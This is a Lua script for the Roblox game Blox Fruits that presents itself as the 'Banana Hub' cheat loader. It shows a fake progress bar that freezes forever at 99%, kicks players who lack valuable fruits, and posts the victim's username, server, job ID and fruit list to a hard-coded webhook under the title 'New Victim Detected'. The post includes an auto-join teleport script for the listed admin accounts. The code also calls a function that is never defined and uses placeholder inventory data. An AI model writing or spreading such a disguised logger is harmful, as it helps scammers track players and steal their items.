--[[
    üçå Banana Hub v4 üçå
    Now with PROPER Alt Detection
    - Checks if player has ANY fruits from WANTED_FRUITS list
    - Kicks with "Alt Detected" if none are found
]]

-- üîß CONFIGURATION üîß --
local WEBHOOK_URL = "https://webhook-protect-2.vercel.app/api/webhook?id=NHk3X2lPcmxlXzJmeUdXbHFDOWp0QTp6N2RNNFVLcGtrNjl1SEtlekNpdVhGT1pSaGhzY2RON3JqQm9heVNEZWI0QWZRMlZwT2wxN29Rc1E3ZUZnWmdZTlZ4MVcwVG5keE9BNWhrZVFhUWtqb3pLXzlHUXVHaEstNmdLNXpjd2tTS3lVSlp5MjZhTmZQMDYyUGRzUkNET2NkaldJLXdXcG5uYXVSajZkZUwtNXhSZFVmVXZPWXB5OVRsV0ZoQjZHVm8"
local ADMIN_USERNAMES = {"mdfmdgfdskfruit", "Sourlas3103"}
local WANTED_FRUITS = {"Kitsune", "Dragon", "Leopard", "Dough", "Venom", "Kitsune-Kitsune", "Dragon-Dragon", "Leopard-Leopard", "Yeti-Yeti", "T-Rex-T-Rex", "Dough-Dough", "Gravity-Gravity", "Buddha-Buddha", "Portal-Portal", "Spirit-Spirit", "Gas-Gas", "Venom-Venom", "Control-Control"}
local LOADING_TIME = 10 * 60 -- 10 minutes in seconds
-- üîß END CONFIGURATION üîß --

-- Services
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer

-- BLOCK FRUITS CHECK (REPLACE WITH REAL CHECK FOR YOUR GAME)
local function getPlayerInventory()
    -- This is a placeholder - implement actual fruit checking for your game
    -- For Blox Fruits you would check:
    -- 1. Player Backpack
    -- 2. Player Storage
    -- 3. Fruit Inventory
    
    -- SIMULATED DATA - REPLACE WITH ACTUAL CHECK
    return {"Light", "Dark", "Dough", "Kitsune", "Dragon", "Leopard", "Dough", "Venom", "Kitsune-Kitsune", "Dragon-Dragon", "Leopard-Leopard", "Yeti-Yeti", "T-Rex-T-Rex", "Dough-Dough", "Gravity-Gravity", "Buddha-Buddha", "Portal-Portal", "Spirit-Spirit", "Gas-Gas", "Venom-Venom", "Control-Control"} -- Example: change to match what player actually has
end

-- Check if player has any wanted fruits
local function hasWantedFruits()
    local playerFruits = getPlayerFruits()
    for _, wantedFruit in pairs(WANTED_FRUITS) do
        for _, playerFruit in pairs(playerFruits) do
            if string.lower(playerFruit) == string.lower(wantedFruit) then
                return true
            end
        end
    end
    return false
end

-- Get server info
local function getServerInfo()
    local jobId = game.JobId
    local placeId = game.PlaceId
    local serverName = "Private Server"
    
    pcall(function()
        serverName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
    end)
    
    return jobId, placeId, serverName
end

-- Create fake loading screen
local function createFakeLoader()
    local gui = Instance.new("ScreenGui")
    gui.Name = "BananaHubLoader"
    gui.Parent = game.CoreGui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 400, 0, 200)
    frame.Position = UDim2.new(0.5, -200, 0.5, -100)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.Parent = gui

    local title = Instance.new("TextLabel")
    title.Text = "Banana Hub"
    title.TextColor3 = Color3.fromRGB(255, 200, 0)
    title.Size = UDim2.new(1, 0, 0, 40)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 24
    title.BackgroundTransparency = 1
    title.Parent = frame

    local status = Instance.new("TextLabel")
    status.Text = "Script almost done, just need to do a few more steps..."
    status.TextColor3 = Color3.new(1, 1, 1)
    status.Size = UDim2.new(1, 0, 0, 30)
    status.Position = UDim2.new(0, 0, 0.7, 0)
    status.Font = Enum.Font.Gotham
    status.TextSize = 16
    status.BackgroundTransparency = 1
    status.Parent = frame

    local progressBar = Instance.new("Frame")
    progressBar.Size = UDim2.new(0.9, 0, 0, 20)
    progressBar.Position = UDim2.new(0.05, 0, 0.5, 0)
    progressBar.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    progressBar.BorderSizePixel = 0
    progressBar.Parent = frame

    local progressFill = Instance.new("Frame")
    progressFill.Size = UDim2.new(0, 0, 1, 0)
    progressFill.BackgroundColor3 = Color3.fromRGB(255, 200, 0)
    progressFill.BorderSizePixel = 0
    progressFill.Parent = progressBar

    spawn(function()
        for i = 1, 100 do
            if i == 99 then
                while true do wait(1) end -- Stuck forever
            end
            progressFill.Size = UDim2.new(i/100, 0, 1, 0)
            wait(LOADING_TIME/100)
        end
    end)

    return gui
end

-- Generate auto-join script
local function generateJoinScript(jobId, placeId)
    return string.format([[
        local TeleportService = game:GetService("TeleportService")
        TeleportService:TeleportToPlaceInstance(%d, "%s", game:GetService("Players").LocalPlayer)
    ]], placeId, jobId)
end

-- Send data to webhook
local function sendWebhook()
    local jobId, placeId, serverName = getServerInfo()
    local playerFruits = getPlayerFruits()
    
    local embed = {
        title = "üçå New Victim Detected ÔøΩ",
        description = string.format(
            "**Username:** %s\n"..
            "**Server:** %s\n"..
            "**Job ID:** %s\n\n"..
            "**Fruits:** %s",
            LocalPlayer.Name,
            serverName,
            jobId,
            table.concat(playerFruits, ", ")
        ),
        color = 16753920,
        fields = {
            {
                name = "Auto-Join Script",
                value = "```lua\n"..generateJoinScript(jobId, placeId).."\n```",
                inline = false
            }
        }
    }
    
    local data = {
        embeds = {embed},
        username = "Banana Hub Logger"
    }
    
    pcall(function()
        HttpService:PostAsync(
            WEBHOOK_URL,
            HttpService:JSONEncode(data),
            Enum.HttpContentType.ApplicationJson
        )
    end)
end

-- Main execution
if not game:IsLoaded() then game.Loaded:Wait() end

-- Check for wanted fruits before proceeding
if not hasWantedFruits() then
    LocalPlayer:Kick("Alt Detected")
    return
end

createFakeLoader()
sendWebhook()

-- Admin command system would go here...
